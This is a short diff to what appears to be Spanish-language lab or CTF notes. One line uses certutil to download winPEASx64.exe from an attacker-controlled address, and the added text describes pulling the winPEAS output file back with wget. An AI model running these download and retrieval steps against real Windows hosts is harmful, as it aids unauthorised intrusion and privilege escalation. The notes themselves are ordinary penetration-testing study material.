@@ -333,3 +333,8 @@ certutil.exe -f -urlcache -split http://10.10.14.73:9006/winPEASx64.exe
 
 ![[Pasted image 20240724160615.png]]
 
+`wget`
+descargamos el Output.txt del archivo que acabamos de crear con el `winpeas` para poder verlo en nuestra maquina
+![[Pasted image 20240724161848.png]]
+
+``
